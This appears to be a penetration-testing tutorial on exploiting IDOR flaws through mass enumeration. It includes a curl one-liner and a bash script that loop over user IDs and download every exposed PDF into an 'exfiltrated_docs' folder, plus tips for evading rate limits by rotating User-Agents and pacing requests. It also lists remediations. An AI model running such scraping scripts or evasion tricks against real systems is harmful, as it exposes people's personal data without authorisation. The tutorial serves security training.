
# IDOR - Mass Enumeration & Data Scraping

## 🧠 Overview

Mass Enumeration is the logical next step after discovering an IDOR. It involves automating the retrieval of all available records by iterating through the predictable references (IDs or Filenames) that the application fails to protect.

➡️ **Impact:** Systematic data breach, PII (Personally Identifiable Information) exposure, and full database scraping.

---

## 🔍 Identifying Scraping Targets

### 🧪 Step 1: Pattern Recognition

Analyze how the application names its resources. Look for patterns in the HTML source or API responses.

**Example Source:**

```html
<a href='/documents/Invoice_UID_3_2024.pdf'>Download</a>
<a href='/documents/Report_UID_3_2024.pdf'>Download</a>

```

**Observation:** The application uses a naming convention: `{Type}_UID_{ID}_{Year}.pdf`. This is highly predictable and dangerous.

---

## 🤖 Automating the Exfiltration

### 1. The "One-Liner" (Quick Recon)

Before writing a full script, you can use a chain of Linux commands to verify the scale of the leak:

```bash
curl -s "http://target.com/docs.php?uid=1" | grep -oP "/documents/.*?\.pdf" | sed 's/^/http:\/\/target.com/'

```

### 2. Professional Enumeration Script

A robust script should handle directory creation and basic error checking.

```bash
#!/bin/bash

# Configuration
BASE_URL="http://SERVER_IP:PORT"
OUTPUT_DIR="./exfiltrated_docs"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting Mass Enumeration..."

for uid in {1..50}; do
    echo "[+] Scanning UID: $uid"
    
    # 1. Fetch the page and extract PDF links
    links=$(curl -s "$BASE_URL/documents.php?uid=$uid" | grep -oP "/documents/.*?\.pdf")
    
    if [ -z "$links" ]; then
        echo "    [-] No documents found for UID $uid"
        continue
    fi

    # 2. Download each discovered link
    for link in $links; do
        echo "    [>] Downloading: $link"
        wget -q -P "$OUTPUT_DIR" "$BASE_URL$link"
    done
done

echo "[!] Process Complete. Files saved in $OUTPUT_DIR"

```

---

## 🛡️ Defensive Measures (Remediation)

1. **Indirect Object References:** Instead of `Invoice_3.pdf`, use a mapping system where a random token points to the file in the database.
2. **Access Control Lists (ACL):** Every time a file is requested, the server must verify: `IF (SESSION.USER_ID == FILE.OWNER_ID)`.
3. **Rate Limiting:** Detect and block IPs making thousands of requests in seconds.
4. **Filename Randomization:** Store files with UUIDs (e.g., `550e8400-e29b.pdf`) to make guessing impossible.

---

## 💣 Pentester Mindset: Beyond the Script

### 1. Handling "Stealth"

Mass enumeration is **noisy**. In a real engagement:

* Use `sleep 1` between requests to avoid triggering basic rate limits.
* Rotate **User-Agents** to look like different browsers.
* Monitor your own traffic to ensure you aren't crashing the server.

### 2. Identifying "Gaps" in IDs

If `uid=10` works and `uid=11` fails, don't stop. Sometimes IDs are skipped because accounts were deleted. Always scan a wide range (e.g., 1-1000).

---

## 🔥 Summary of the IDOR Series

| Level | Focus | Key Technique |
| --- | --- | --- |
| **01 - Basic** | Direct IDs | Changing `id=1` to `id=2`. |
| **02 - Obfuscated** | Encoding | Reversing Base64/MD5 IDs. |
| **03 - API/BOLA** | Endpoint Logic | Switching Verbs (GET/POST) and JSON fields. |
| **04 - Mass Enum** | Automation | Scripting for data exfiltration. |

